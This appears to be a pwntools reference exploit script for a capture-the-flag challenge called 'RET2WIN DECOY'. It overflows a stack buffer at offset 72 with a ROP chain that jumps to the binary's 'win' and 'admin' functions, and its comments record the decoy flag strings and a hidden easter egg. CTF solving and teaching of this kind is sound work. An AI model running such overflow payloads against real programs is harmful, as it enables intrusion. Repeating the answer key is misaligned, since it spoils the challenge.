#!/usr/bin/env python3
# RET2WIN DECOY - reference exploit (all three paths).
from pwn import *

context.binary = e = ELF("dist/challenge", checksec=False)
OFFSET = 72                          # 64-byte buf + 8 saved rbp
ret = ROP(e).find_gadget(["ret"])[0] # stack alignment for puts()

def run(target):
    p = e.process()                  # or remote(HOST, PORT)
    p.recvuntil(b"occupant:")
    p.sendline(flat({OFFSET: [ret, e.sym[target]]}))
    print(p.recvall(timeout=3).decode(errors="replace"))
    p.close()

run("win")     # -> DOOM{r3t2w1n_t00_0bv10us}   (bait)
run("admin")   # -> DOOM{s3cr3t_4dm1n_pwn3d}    (earned-fake)
# ... and if you simply send a short line and let it exit cleanly, main()
# calls goodbye() and prints the only message that isn't a flag (the egg).
